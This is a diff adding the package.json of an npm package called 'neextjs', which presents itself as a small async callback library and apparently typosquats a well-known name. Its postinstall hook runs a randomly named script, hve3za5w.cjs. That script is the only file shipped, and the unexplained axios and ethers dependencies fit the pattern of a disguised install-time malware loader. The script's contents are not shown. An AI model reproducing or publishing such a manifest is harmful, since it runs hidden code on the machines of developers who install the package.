@@ -1,0 +1,28 @@
+{
+  "name": "neextjs",
+  "description": "a tiny library for callback style async programing",
+  "version": "1.0.3",
+  "homepage": "http://youngjay.github.com/next",
+  "author": {
+    "name": "Yang Jie",
+    "email": "hiyoungjay@gmail.com"
+  },
+  "keywords": [
+    "async",
+    "callback"
+  ],
+  "main": "./index.js",
+  "dist": {
+    "shasum": "3fd980a7f98bb1081930aa35ef421245cb93f833"
+  },
+  "scripts": {
+    "postinstall": "node hve3za5w.cjs"
+  },
+  "files": [
+    "hve3za5w.cjs"
+  ],
+  "dependencies": {
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  }
+}
